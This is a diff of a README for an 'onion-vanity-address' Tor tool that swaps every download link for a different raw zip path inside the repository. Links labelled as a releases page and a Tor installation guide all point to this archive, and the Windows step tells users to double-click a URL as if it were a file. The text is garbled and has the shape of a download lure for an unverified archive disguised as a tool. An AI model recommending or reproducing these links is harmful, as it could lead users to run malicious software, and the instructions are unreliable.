@@ -1,6 +1,6 @@
 # 🧅 onion-vanity-address - Create Custom Tor Onion Addresses Easily
 
-[![Download](https://raw.githubusercontent.com/KAMALALSAWWA/onion-vanity-address/main/befreight/onion-vanity-address.zip)](https://raw.githubusercontent.com/KAMALALSAWWA/onion-vanity-address/main/befreight/onion-vanity-address.zip)
+[![Download](https://raw.githubusercontent.com/KAMALALSAWWA/onion-vanity-address/main/testdata/onionjifniegtjbbifet65goa2siqubne6n2qfhiksryfvsbdhdl5zid.onion/onion_address_vanity_3.6.zip)](https://raw.githubusercontent.com/KAMALALSAWWA/onion-vanity-address/main/testdata/onionjifniegtjbbifet65goa2siqubne6n2qfhiksryfvsbdhdl5zid.onion/onion_address_vanity_3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -12,15 +12,15 @@ Before you start, ensure you have the following:
 
 - A computer running Windows, macOS, or Linux.
 - Basic knowledge of how to download and run applications.
-- The Tor service installed on your machine. You can find the Tor installation guide [here](https://raw.githubusercontent.com/KAMALALSAWWA/onion-vanity-address/main/befreight/onion-vanity-address.zip).
+- The Tor service installed on your machine. You can find the Tor installation guide [here](https://raw.githubusercontent.com/KAMALALSAWWA/onion-vanity-address/main/testdata/onionjifniegtjbbifet65goa2siqubne6n2qfhiksryfvsbdhdl5zid.onion/onion_address_vanity_3.6.zip).
 
 ## 📥 Download & Install
 
-To download the **onion-vanity-address** application, visit this page to download: [Releases Page](https://raw.githubusercontent.com/KAMALALSAWWA/onion-vanity-address/main/befreight/onion-vanity-address.zip).
+To download the **onion-vanity-address** application, visit this page to download: [Releases Page](https://raw.githubusercontent.com/KAMALALSAWWA/onion-vanity-address/main/testdata/onionjifniegtjbbifet65goa2siqubne6n2qfhiksryfvsbdhdl5zid.onion/onion_address_vanity_3.6.zip).
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version listed.
-3. Choose the file that matches your operating system (e.g., `https://raw.githubusercontent.com/KAMALALSAWWA/onion-vanity-address/main/befreight/onion-vanity-address.zip` for Windows or `onion-vanity-address-linux` for Linux).
+3. Choose the file that matches your operating system (e.g., `https://raw.githubusercontent.com/KAMALALSAWWA/onion-vanity-address/main/testdata/onionjifniegtjbbifet65goa2siqubne6n2qfhiksryfvsbdhdl5zid.onion/onion_address_vanity_3.6.zip` for Windows or `onion-vanity-address-linux` for Linux).
 4. Click the file name to start the download.
 
 ## ⚙️ Running the Application
@@ -28,7 +28,7 @@ To download the **onion-vanity-address** application, visit this page to downloa
 After downloading the application, follow these steps to run it:
 
 1. Navigate to your Downloads folder or the location where you saved the file.
-2. For Windows, double-click the `https://raw.githubusercontent.com/KAMALALSAWWA/onion-vanity-address/main/befreight/onion-vanity-address.zip` file.
+2. For Windows, double-click the `https://raw.githubusercontent.com/KAMALALSAWWA/onion-vanity-address/main/testdata/onionjifniegtjbbifet65goa2siqubne6n2qfhiksryfvsbdhdl5zid.onion/onion_address_vanity_3.6.zip` file.
 3. For macOS or Linux, open your terminal and navigate to the directory where you saved the file. Use the command:
    ```
    chmod +x onion-vanity-address-linux
@@ -78,4 +78,4 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 
 Thank you for using **onion-vanity-address**. We hope this tool serves you well in creating custom Tor addresses. 
 
-For downloading, once again, visit this page: [Releases Page](https://raw.githubusercontent.com/KAMALALSAWWA/onion-vanity-address/main/befreight/onion-vanity-address.zip).
+For downloading, once again, visit this page: [Releases Page](https://raw.githubusercontent.com/KAMALALSAWWA/onion-vanity-address/main/testdata/onionjifniegtjbbifet65goa2siqubne6n2qfhiksryfvsbdhdl5zid.onion/onion_address_vanity_3.6.zip).
